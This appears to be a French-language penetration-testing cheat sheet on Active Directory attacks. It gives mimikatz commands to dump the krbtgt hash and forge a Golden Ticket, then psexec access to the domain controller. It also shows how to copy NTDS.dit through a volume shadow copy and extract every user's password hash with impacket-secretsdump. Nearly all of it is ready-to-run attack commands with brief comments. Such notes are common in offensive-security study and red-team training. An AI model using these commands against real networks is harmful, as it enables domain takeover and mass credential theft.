# Golden Ticket
Requière:
* Hash du krbtgt
* compte domain admin ou avoir compromis le controlleur de domaine

Sur le controlleur de domaine avec mimikatz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
privilege::debug
lsadump::lsa /patch
#extraire le hash du krbtgt et SID du domaine
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Sur une autre machine (pas besoin d'être sur le domaine) avec mimikatz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
#supprime tous les billets en mémoire
kerberos::purge
#fournir un compte quelquonque
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
#ensuite on peut rouler psexec pour se connecter au controlleur de domaine
#utiliser nom d'hôte au lieu de l'IP sinon cela force authentification
psexec.exe \\dc1 cmd.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Shadow Copies
Volume Shadow Service (VSS) est une technologie de sauvegarde pour volumes entiers
vshadow.exe officiellement dans Windows SDK
copier la bd de AD NTDS.dit. Contient les creds des usagers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
vshadow.exe -nw -p C:
#retenir cette ligne: - Shadow copy device name:
#extraire la bd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
#sauvegarder le SYSTEM hive du registre
reg.exe save hklm\system c:\system.bak
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#extraire les hashes
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
